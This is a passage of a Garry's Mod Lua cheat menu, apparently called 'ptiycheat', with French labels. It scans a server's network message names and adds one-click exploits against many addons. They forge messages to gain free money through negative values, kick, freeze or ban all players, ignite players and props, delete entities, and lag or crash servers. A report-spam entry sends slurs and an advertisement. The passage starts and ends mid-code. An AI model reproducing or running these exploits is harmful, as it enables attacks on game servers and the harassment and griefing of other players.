net.WriteString("99999999")
net.WriteEntity(LocalPlayer())
net.SendToServer()
end )
end

status = ValidNetString("ATMDepositMoney")
if (status) then
CHATPRINT("Exploit Trouvé : Argent Gratuite #6 [ATMDepositMoney]")
addExploit( "111","Argent Gratuite #6", "an exploit in 'ATM'", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
net.Start("ATMDepositMoney")
net.WriteFloat(-9999999)
net.SendToServer()
end )
end

status = ValidNetString("SellMinerals")
if (status) then
CHATPRINT("Exploit Trouvé : Argent Gratuite #7 [SellMinerals]")
addExploit( "112","Argent Gratuite #7", "an exploit in 'eMining'", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
for k,v in pairs(SkillDB) do
if not ( v.iSkill == true ) then
net.Start("Upgrade")
net.WriteTable( { LuaName = v.LuaName, Amount = -9999999 } )
net.SendToServer()
net.Start("SellMinerals")
net.WriteTable({ Target = LocalPlayer() })
net.SendToServer()
end
end
end )
end

status = ValidNetString("TakeBetMoney")
if (status) then
CHATPRINT("Exploit Trouvé : Argent Gratuite #8 [TakeBetMoney]")
addExploit( "113","Argent Gratuite #8", "Recevoir De L'Argent", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
net.Start("TakeBetMoney")
net.WriteTable({1e333333 , 1e333333})
net.SendToServer()
end )
end

status = ValidNetString("Kun_SellOil")
if (status) then
CHATPRINT("Exploit Trouvé : Argent Gratuite #9 [Kun_SellOil]")
addExploit( "114","Argent Gratuite #9", "Recevoir De L'Argent", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
for k,v in pairs(ents.GetAll()) do
net.Start("Kun_SellOil")
net.WriteEntity(v)
net.SendToServer()
end
end )
end

status = ValidNetString("DepositMoney")
if (status) then
CHATPRINT("Exploit Trouvé : Argent Gratuite #10 [DepositMoney]")
addExploit( "115","Argent Gratuite #10", "Recevoir De L'Argent", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
net.Start("DepositMoney")
for k,v in pairs(ents.GetAll()) do
net.WriteEntity(v)
net.WriteString(-100000000 )
net.WriteEntity(LocalPlayer())
net.SendToServer()
end
end )
end

status = ValidNetString("NET_SS_DoBuyTakeoff")
if (status) then
CHATPRINT("Exploit Trouvé : Argent Gratuite #11 [NET_SS_DoBuyTakeoff]")
addExploit( "116","Argent Gratuite #11", "Recevoir De L'Argent", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
net.Start("NET_SS_DoBuyTakeoff",true)
net.WriteEntity(LocalPlayer())
net.WriteEntity(table.Random(player.GetAll()))
net.WriteTable({})
net.WriteInt(-1000000000000000000000000000000000000000000000000000000000000000000, 16)
net.SendToServer()
end )
end

status = ValidNetString("NET_EcSetTax")
if (status) then
CHATPRINT("Exploit Trouvé : Argent Gratuite #12 [NET_EcSetTax]")
addExploit( "117","Argent Gratuite #12", "Recevoir De L'Argent", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
net.Start("NET_EcSetTax")
net.WriteInt(-9999999999, 16)
net.SendToServer()
end )
end

status = ValidNetString("RP_Accept_Fine")
if (status) then
CHATPRINT("Exploit Trouvé : Argent Gratuite #13 [RP_Accept_Fine]")
addExploit( "118","Argent Gratuite #13", "Recevoir De L'Argent", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
for k,v in pairs(player.GetAll())do
net.Start("RP_Accept_Fine")
net.WriteString(v:Nick())
net.WriteDouble(-999999999999)
net.SendToServer()
end
end )
end

status = ValidNetString("drugseffect_remove")
if (status) then
CHATPRINT("Exploit Trouvé : Supprimer Armes [drugseffect_remove]")
addExploit( "119","Supprimer Armes", "Supprimer Toutes Les Armes", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
net.Start("drugseffect_remove")
net.SendToServer()
end )
end

status = ValidNetString("drugs_money")
if (status) then
CHATPRINT("Exploit Trouvé : Supprimer L'Argent [drugs_money]")
addExploit( "120","Supprimer L'Argent", "Adieu L'argent :c", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
net.Start("drugs_money")
net.SendToServer()
end )
end

status = ValidNetString("CRAFTINGMOD_SHOP")
if (status) then
CHATPRINT("Exploit Trouvé : Argent Gratuite #14 [CRAFTINGMOD_SHOP]")
addExploit( "121","Argent Gratuite #14", "an exploit in 'crafting mod'", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
net.Start("CRAFTINGMOD_SHOP")
net.WriteTable({
BUY =   -9999999;
type    =   1
})
net.WriteInt(1,16)
net.SendToServer()
end )
end

status = ValidNetString("drugs_ignite")
if (status) then
CHATPRINT("Exploit Trouvé : Brûler Des Joueurss [drugs_ignite]")
addExploit( "122","Brûler Des Joueurss", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
net.Start("drugs_ignite")
net.WriteString("player")
net.SendToServer()
end )
end

status = ValidNetString("drugs_ignite")
if (status) then
CHATPRINT("Exploit Trouvé : Props En Feu [drugs_ignite]")
addExploit( "123","Props En Feu", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
net.Start("drugs_ignite")
net.WriteString("prop_physics")
net.SendToServer()
end )
end

status = ValidNetString("drugseffect_hpremove")
if (status) then
CHATPRINT("Exploit Trouvé : Modifier PV [drugseffect_hpremove]")
addExploit( "124","Modifier PV", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
net.Start("drugseffect_hpremove")
net.WriteString(99999)
net.SendToServer()
end )
end

status = ValidNetString("drugs_text")
if (status) then
CHATPRINT("Exploit Trouvé : Supprimer Tous Les Props #2 [drugs_text]")
addExploit( "125","Supprimer Tous Les Props #2", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
net.Start("drugs_text")
net.WriteString("prop_physics")
net.SendToServer()
end )
end

status = ValidNetString("drugs_give")
if (status) then
CHATPRINT("Exploit Trouvé : Donnez Un RPG A Tout Le Monde [drugs_give]")
addExploit( "126","Donnez Un RPG A Tout Le Monde", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
net.Start("drugs_give")
net.WriteString("weapon_rpg")
net.SendToServer()
end )
end

status = ValidNetString("drugs_text")
if (status) then
CHATPRINT("Exploit Trouvé : Supprimer L'Eau [drugs_text]")
addExploit( "127","Supprimer L'Eau", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
net.Start("drugs_text")
net.WriteString("func_water_analog")
net.SendToServer()
end )
end

status = ValidNetString("drugs_effect")
if (status) then
local eye = LocalPlayer():GetEyeTrace().Entity
local send = "del|"..eye:EntIndex()
CHATPRINT("Exploit Trouvé : Supprimer ce qu'on regarde [drugs_effect]")
addExploit( "128","Supprimer ce qu'on regarde", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
net.Start("drugs_effect")
net.WriteString(send)
net.SendToServer()
end )
end

status = ValidNetString("RecKickAFKer")
if (status) then
CHATPRINT("Exploit Trouvé : Kick Tous Le Monde #2 [RecKickAFKer]")
addExploit( "129","Kick Tous Le Monde #2", "Kick Tous Le Monde", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
for k, v in pairs( player.GetAll() ) do
net.Start("RecKickAFKer")
net.WriteEntity(v)
net.SendToServer()
end
end )
end

status = ValidNetString("GMBG:PickupItem")
if (status) then
CHATPRINT("Exploit Trouvé : Recevoir Items [GMBG:PickupItem]")
addExploit( "130","Recevoir Items", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
for k, v in pairs(ents.GetAll()) do
if v:GetClass() == "item_loot" then
net.Start("GMBG:PickupItem")
net.WriteEntity(v)
net.SendToServer()
net.Start("GMBG:PickupItem")
net.WriteEntity(v)
net.SendToServer()
net.Start("GMBG:PickupItem")
net.WriteEntity(v)
net.SendToServer()
net.Start("GMBG:PickupItem")
net.WriteEntity(v)
net.SendToServer()
net.Start("GMBG:PickupItem")
net.WriteEntity(v)
net.SendToServer()
net.Start("GMBG:PickupItem")
net.WriteEntity(v)
net.SendToServer()
end
end
end )
end

status = ValidNetString("plyWarning")
if (status) then
CHATPRINT("Exploit Trouvé : Kick Tous Le Monde #3 [plyWarning]")
addExploit( "131","Kick Tous Le Monde #3", "Kick Tous Le Monde", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
for k, v in pairs( player.GetAll() ) do
net.Start('plyWarning')
net.WriteEntity(v)
net.WriteString('You have to select a player before doing a action.')
net.SendToServer()
end
end )
end

status = ValidNetString("NLR.ActionPlayer")
if (status) then
CHATPRINT("Exploit Trouvé : Freeze Tout Le Monde [NLR.ActionPlayer]")
addExploit( "132","Freeze Tout Le Monde", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
for k, v in pairs( player.GetAll() ) do
net.Start("NLR.ActionPlayer")
net.WriteEntity(v)
net.SendToServer()
end
end )
end

status = ValidNetString("kart_sell")
if (status) then
CHATPRINT("Exploit Trouvé : Argent Gratuite #15 [kart_sell]")
addExploit( "133","Argent Gratuite #15", "Recevoir De L'Argent", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
for i=1, 300 do
net.Start("kart_sell")
net.WriteString("sw_gokart")
net.SendToServer()
end
end )
end

status = ValidNetString("ClickerAddToPoints")
if (status) then
CHATPRINT("Exploit Trouvé : Point Gratuit [ClickerAddToPoints]")
addExploit( "134","Point Gratuit", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
net.Start("ClickerAddToPoints")
net.WriteInt(99999999, 32)
net.SendToServer()
end )
end

status = ValidNetString("bodyman_model_change")
if (status) then
CHATPRINT("Exploit Trouvé : Body Groups [bodyman_model_change]")
addExploit( "135","Body Groups", "constantly changes your appearance", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
local PM = 1
local SK = 1
local BG = 1
local HN = 1
local TS = 1
local GL = 1
local LG = 1
if !timer.Exists( "bodygroups" ) then
timer.Create("bodygroups", 0, 0, function()
PlayerModels = {0,1,2,3,4,5,6}
Torso = {0,1,2,3,4,5,6,7,8,9,10}
Legs = {0,1,2,3,4,5,6}
Hands = {0,1,2}
Glasses = {0,1}
Skins = {0,1,2,3,4,5,6,7,8,9,10}
PM = PM+1
TS = TS+1
LG = LG+1
HN = HN+1
GL = GL+1
SK = SK+1
if (PM>#PlayerModels) then PM=1 end
if (SK>#Skins) then SK=1 end
if (HN>#Hands) then HN=1 end
if (TS>#Torso) then TS=1 end
if (GL>#Glasses) then GL=1 end
if (LG>#Legs) then LG=1 end
net.Start("bodyman_model_change")
net.WriteInt(PlayerModels[PM], 10 )
net.SendToServer()
net.Start("bodygroups_change")
net.WriteTable( { 1, Torso[TS] } )
net.SendToServer()
net.Start("bodygroups_change")
net.WriteTable( { 2, Legs[LG] } )
net.SendToServer()
net.Start("bodygroups_change")
net.WriteTable( { 3, Hands[HN] } )
net.SendToServer()
net.Start("bodygroups_change")
net.WriteTable( { 4, Glasses[GL] } )
net.SendToServer()
end )
else
timer.Remove("bodygroups")
--("Stopping")
end
end )
end

status = ValidNetString("SendMoney")
if (status) then
CHATPRINT("Exploit Trouvé : Argent Gratuite #16 [SendMoney]")
addExploit( "136","Argent Gratuite #16", "Recevoir De L'Argent", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
hook.Remove( "HUDPaint", "skhdsakjl")
net.Start("SendMoney")
net.WriteEntity(LocalPlayer())
net.WriteEntity(LocalPlayer())
net.WriteEntity(LocalPlayer())
net.WriteString("-99999999")
net.SendToServer()
end )
end

status = ValidNetString("BailOut")
if (status) then
CHATPRINT("Exploit Trouvé : Argent Gratuite #17 [BailOut]")
addExploit( "137","Argent Gratuite #17", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
for k, v in pairs(player.GetAll()) do
net.Start("BailOut")
net.WriteEntity(LocalPlayer())
net.WriteEntity(v)
net.WriteFloat(-999999999)
net.SendToServer()
end
end )
end

status = ValidNetString("hitcomplete")
if (status) then
CHATPRINT("Exploit Trouvé : Argent Gratuite #18 [hitcomplete]")
addExploit( "138","Argent Gratuite #18", "Recevoir De L'Argent", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
net.Start("hitcomplete")
net.WriteDouble(99999999)
net.SendToServer()
end )
end
----------------------------------------
for k,v in pairs(player.GetAll()) do
dahater = v
end
----------------------------------------
status = ValidNetString("hhh_request")
if (status) then
CHATPRINT("Exploit Trouvé : Argent Gratuite #19 [hhh_request]")
addExploit( "139","Argent Gratuite #19", "Recevoir De L'Argent", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
local plyhhh = LocalPlayer()
if dahater != plyhhh then
local hitRequest = {}
hitRequest.hitman = plyhhh
hitRequest.requester = plyhhh
hitRequest.target = dahater
hitRequest.reward = -9999999
net.Start('hhh_request')
net.WriteTable(hitRequest)
net.SendToServer()
else
CHATPRINT("In this version of HHH, you can not use an exploit!")
end
end )
end

status = ValidNetString("DaHit")
if (status) then
CHATPRINT("Exploit Trouvé : Argent Gratuite #20 [DaHit]")
addExploit( "140","Argent Gratuite #20", "Recevoir De L'Argent", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
hook.Remove( "HUDPaint", "skhdsakjl")
net.Start("DaHit")
net.WriteFloat(-99999999)
net.WriteEntity(LocalPlayer())
net.WriteEntity(LocalPlayer())
net.WriteEntity(LocalPlayer())
net.SendToServer()
end )
end

status = ValidNetString("textstickers_entdata")
if (status) then
CHATPRINT("Exploit Trouvé : Crash #2 [textstickers_entdata]")
addExploit( "141","Crash #2", "1tap", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
net.Start("textstickers_entdata")
net.WriteUInt(0xFFFFFFF, 32)
net.SendToServer()
end )
end

status = ValidNetString("gBan.BanBuffer")
if (status) then
CHATPRINT("Exploit Trouvé : gBan Tout Le Monde [gBan.BanBuffer]")
addExploit( "142","gBan Tout Le Monde", "Marche avec la vieille version de GBan", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
for k,v in pairs(player.GetAll()) do
if v != LocalPlayer() then
net.Start("gBan.BanBuffer")
net.WriteBool(true)
net.WriteInt(0, 32)
net.WriteString("haha owned")
net.WriteString(v:SteamID())
net.SendToServer()
end
end
end )
end

status = ValidNetString("ARMORY_RetrieveWeapon")
if (status) then
CHATPRINT("Exploit Trouvé : Armure Gratuite #1 [ARMORY_RetrieveWeapon]")
addExploit( "143","Armure Gratuite #1", "get weapon #1", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
net.Start("ARMORY_RetrieveWeapon")
net.WriteString("weapon1")
net.SendToServer()
end )
end

status = ValidNetString("ARMORY_RetrieveWeapon")
if (status) then
CHATPRINT("Exploit Trouvé : Armure Gratuite #2 [ARMORY_RetrieveWeapon]")
addExploit( "144","Armure Gratuite #2", "get weapon #2", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
net.Start("ARMORY_RetrieveWeapon")
net.WriteString("weapon2")
net.SendToServer()
end )
end

status = ValidNetString("ARMORY_RetrieveWeapon")
if (status) then
CHATPRINT("Exploit Trouvé : Armure Gratuite #3 [ARMORY_RetrieveWeapon]")
addExploit( "145","Armure Gratuite #3", "get weapon #3", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
net.Start("ARMORY_RetrieveWeapon")
net.WriteString("weapon3")
net.SendToServer()
end )
end

status = ValidNetString("TransferReport")
if (status) then
CHATPRINT("Exploit Trouvé : Spam De Report [TransferReport]")
addExploit( "146","Spam De Report", "Report Tout Le Monde players", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
net.Start("TransferReport")
net.WriteString(v:SteamID())
net.WriteString("CHINKGANG FAGOTS")
net.WriteString("DITCH THIS SHITTY SERVER AND BUY ptiycheat TODAY")
net.SendToServer()
end )
end

status = ValidNetString("FIRE_CreateFireTruck")
if (status) then
CHATPRINT("Exploit Trouvé : Crée Un Camion De Pompier [FIRE_CreateFireTruck]")
addExploit( "147","Crée Un Camion De Pompier", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
net.Start("FIRE_CreateFireTruck")
net.SendToServer()
end )
end

status = ValidNetString("TFA_Attachment_RequestAll")
if (status) then
CHATPRINT("Exploit Trouvé : Crée Des Lags #20 [TFA_Attachment_RequestAll]")
addExploit( "148","Crée Des Lags #20", "an exploit in 'TFA Weapon Pack', discovered by zerg314", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") if !timer.Exists( "lagger20" ) then
timer.Create("lagger20", 0,0, function()
for i = 1, 800 do
net.Start("TFA_Attachment_RequestAll",true)
net.SendToServer()
end
end)
--("Lags Démarré")
else
timer.Remove("lagger20")
--("Lags Arreté")
end
end)
end

status = ValidNetString("FIRE_RemoveFireTruck")
if (status) then
CHATPRINT("Exploit Trouvé : Supprimer Les Camions De Pompier [FIRE_RemoveFireTruck]")
addExploit( "149","Supprimer Les Camions De Pompier", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
net.Start("FIRE_RemoveFireTruck")
net.SendToServer()
end )
end

status = ValidNetString("gPrinters.sendID")
if (status) then
CHATPRINT("Exploit Trouvé : Crée Des Lags #21 [gPrinters.sendID]")
addExploit( "150","Crée Des Lags #21", "B1G LAGZ, ", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
if not timer.Exists("lagger21") then
timer.Create("lagger21", 0, 0, function()
for i = 1, 1000 do
net.Start("gPrinters.sendID",true)
net.WriteEntity(LocalPlayer())
net.WriteUInt(9999999999999999999999999999999999999999999999999999999999, 8)
net.SendToServer()
end
end )
end
end )
end

status = ValidNetString("requestmoneyforvk") -- RusElite Server
if (status) then
CHATPRINT("Exploit Trouvé : Recevoir 50k [requestmoneyforvk]")
addExploit( "151","Recevoir 50k", "Argent Facile Tu Peut Pas Test", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
net.Start("requestmoneyforvk")
net.WriteEntity(LocalPlayer())
net.SendToServer()
end )
end

status = ValidNetString("NET_BailPlayer")
if (status) then
CHATPRINT("Exploit Trouvé : Spam Les Joueurs [NET_BailPlayer]")
addExploit( "153","Spam Les Joueurs", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
for k, v in pairs (player.GetAll()) do
net.Start("NET_BailPlayer")
net.WriteEntity(v)
net.WriteEntity(v)
net.SendToServer()
end
end )
end

status = ValidNetString("Taxi_Add")
if (status) then
CHATPRINT("Exploit Trouvé : Argent Gratuite #21 [Taxi_Add]")
addExploit( "154","Argent Gratuite #21", "Peu ne pas marcher", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
net.Start("Taxi_Add")
net.WriteString("MLG")
net.WriteTable({-1333.647461, -1473.931763, -139.968750})
net.WriteFloat(-99999999)
net.WriteString(Desc)
net.SendToServer()
end )
end

status = ValidNetString("BuyCar")
if (status) then
CHATPRINT("Exploit Trouvé : Argent Gratuite #22 [BuyCar]")
addExploit( "155","Argent Gratuite #22", "Recevoir De L'Argent", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
for k,v in pairs(player.GetAll()) do
net.Start('BuyCar')
net.WriteFloat(-10000000000000000000000000000000000000000000000000000000000000000000000000000000000)
net.WriteEntity(LocalPlayer())
net.WriteString("Gay")
net.WriteString("Cock")
net.WriteString("Twat")
net.SendToServer()
end
end )
end

status = ValidNetString("rpi_trade_end")
if (status) then
CHATPRINT("Exploit Trouvé : Test Fonction [rpi_trade_end]")
addExploit( "156","Test Fonction", "just test", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
local it = 0
timer.Create( util.CRC( tostring( CurTime() ) ), 0.5, 0, function()
if( it > #player.GetAll() ) then
it = 1;
else
it = it + 1;
end
net.Start("rpi_trade_end")
net.WriteUInt( it, 16 )
net.SendToServer()
end )
end )
end

status = ValidNetString("ClickerForceSave")
if (status) then
CHATPRINT("Exploit Trouvé : Crash Avec Un Melon [ClickerForceSave]")
addExploit( "157","Crash Avec Un Melon", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
hook.Add("Think","ps_spam",function()
for k, v in pairs (player.GetAll()) do
net.Start("ClickerForceSave")
net.WriteEntity(ply)
net.WriteInt(1, 1)
net.SendToServer()
end
end )
end )
end

status = ValidNetString("SRequest")
if (status) then
CHATPRINT("Exploit Trouvé : Prendre Un Deagle [SRequest]")
addExploit( "158","Prendre Un Deagle", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
for k, v in pairs (player.GetAll()) do
net.Start("SRequest")
net.WriteEntity(v)
net.SendToServer()
end
end )
end

status = ValidNetString("HealButton")
if (status) then
CHATPRINT("Exploit Trouvé : PV Gratuit [HealButton]")
addExploit( "159","PV Gratuit", "PV Gratuit", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
net.Start("HealButton")
net.WriteEntity(LocalPlayer())
net.WriteFloat(999999)
net.SendToServer()
end )
end

status = ValidNetString("ArmorButton")
if (status) then
CHATPRINT("Exploit Trouvé : Armure Gratuite [ArmorButton]")
addExploit( "160","Armure Gratuite", "Armure Gratuite", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
net.Start("ArmorButton")
net.WriteEntity(LocalPlayer())
net.WriteFloat(999999)
net.SendToServer()
end )
end

status = ValidNetString("SprintSpeedset")
if (status) then
CHATPRINT("Exploit Trouvé : TTT SpeedHack [SprintSpeedset]")
addExploit( "161","TTT SpeedHack", "changes your speed", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
net.Start("SprintSpeedset")
net.WriteFloat(math.min(math.max(2, 0.1),2 ))
net.SendToServer()
end )
end

status = ValidNetString("GiveArmor100")
if (status) then
CHATPRINT("Exploit Trouvé : Exploit D'Armure  [GiveArmor100]")
addExploit( "162","Exploit D'Armure ", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
net.Start("GiveArmor100")
net.SendToServer()
end )
end

status = ValidNetString("Client_To_Server_OpenEditor")
if (status) then
CHATPRINT("Exploit Trouvé : SCP 249 Hack Menu De Boisson [Client_To_Server_OpenEditor]")
addExploit( "164","SCP 249 Drink Menu Hack", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
net.Start("Client_To_Server_OpenEditor")
net.SendToServer()
end )
end

status = ValidNetString("DuelMessageReturn")
if (status) then
CHATPRINT("Exploit Trouvé : Combat Fou [DuelMessageReturn]")
addExploit( "165","Combat Fou", "forces all players to fight with all players, ", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
timer.Create("crazyduel", 0.1, 0, function()
s.duel[1] = table.Random( player.GetAll() )
s.duel[2] = table.Random( player.GetAll() )
net.Start("DuelMessageReturn")
net.WriteFloat(1)
net.WriteTable(s.duel)
net.SendToServer()
end )
end )
end

status = ValidNetString("userAcceptPrestige")
if (status) then
CHATPRINT("Exploit Trouvé : Prestige Gratuit [userAcceptPrestige]")
addExploit( "166","Prestige Gratuit", "exploit for Prestige Gratuit", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
net.Start("userAcceptPrestige")
net.SendToServer()
end )
end

status = ValidNetString("wordenns")
if (status) then
CHATPRINT("Exploit Trouvé : Voler L'argents De Tous #11 [wordenns]")
addExploit( "167","Voler L'argents De Tous #11", "withdraw money from all printers", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
CHATPRINT("printers:".. tostring(#ents.FindByClass("derma_printer")))
for k,v in pairs(ents.FindByClass("derma_printer")) do
net.Start("wordenns")
net.WriteEntity(v)
net.SendToServer()
end
end)
end

status = ValidNetString("guncraft_removeWorkbench")
if (status) then
CHATPRINT("Exploit Trouvé : Supprimer Toutes Les Entités [guncraft_removeWorkbench]")
addExploit( "168","Supprimer Toutes Les Entités", "an exploit in addon 'GunCraft'", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
if !timer.Exists( "removentity" ) then
timer.Create("removentity", 3, 0, function()
for k,v in pairs(ents.GetAll()) do
net.Start("guncraft_removeWorkbench")
net.WriteEntity(v)
net.SendToServer()
end
end )
end
end )
end

status = ValidNetString("BuyKey")
if (status) then
CHATPRINT("Exploit Trouvé : Blue Unbox Exploit")
addExploit( "169","Blue Unbox Exploit", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
net.Start("BuyKey")
net.SendToServer()
net.Start("BuyCrate")
net.SendToServer()
end )
end

status = ValidNetString("casinokit_chipexchange")
if (status) then
CHATPRINT("Exploit Trouvé : Argent Gratuite #23 [casinokit_chipexchange]")
addExploit( "170","Argent Gratuite #23", "only works if outdated", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
local moneylog = LocalPlayer():getDarkRPVar("money")
net.Start("casinokit_chipexchange")
net.WriteEntity(self)
net.WriteString("darkrp")
net.WriteBool(true)
net.WriteUInt(LocalPlayer():getDarkRPVar("money"),32)
net.SendToServer()
timer.Simple(3, function()
for i=1, 5000 do
net.Start("casinokit_chipexchange")
net.WriteEntity(self)
net.WriteString("darkrp")
net.WriteBool(false)
net.WriteUInt(moneylog*0.10,32)
net.SendToServer()
end
end)
end )
end

status = ValidNetString("PurchaseWeed")
if (status) then
CHATPRINT("Exploit Trouvé : Achetez Drogue [PurchaseWeed]")
addExploit( "171","Achetez Drogue", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
net.Start("PurchaseWeed")
net.WriteInt(tonumber(10000),16)
net.WriteInt(tonumber(1),16)
net.WriteBool(LocalPlayer().Buying)
net.SendToServer()
end )
end

status = ValidNetString("PurchaseWeed")
if (status) then
CHATPRINT("Exploit Trouvé : Vendre Weed [PurchaseWeed]")
addExploit( "172","Vendre Weed", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
net.Start("PurchaseWeed")
net.WriteInt(tonumber(100),16)
net.WriteInt(tonumber(100),16)
net.WriteBool(LocalPlayer().Selling)
net.SendToServer()
end )
end

status = ValidNetString("DoDealerDeliver")
if (status) then
CHATPRINT("Exploit Trouvé : Achetez Tablette [DoDealerDeliver]")
addExploit( "173","Achetez Tablette", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
if(LocalPlayer():getDarkRPVar("money")>=WEED_CONFIG.TabletPrice) then
net.Start("DoDealerDeliver")
net.WriteBool(false)
net.SendToServer()
end
end )
end

status = ValidNetString("DoDealerDeliver")
if (status) then
CHATPRINT("Exploit Trouvé : Achetez Bong [DoDealerDeliver]")
addExploit( "174","Achetez Bong", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
if(LocalPlayer():getDarkRPVar("money")>=WEED_ITEMS.Items["Tools"]["bong"].price) then
net.Start("DoDealerDeliver")
net.WriteBool(true)
net.SendToServer()
end
end )
end

status = ValidNetString("sendDuelInfo")
if (status) then
CHATPRINT("Exploit Trouvé : Exploit Du NPC De Duel [sendDuelInfo]")
addExploit( "175","Exploit Du NPC De Duel", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
net.Start("sendDuelInfo")
net.WriteString(table.Random(player.GetAll()):Nick())
net.WriteString("xxdddd")
net.WriteString("1e+100")
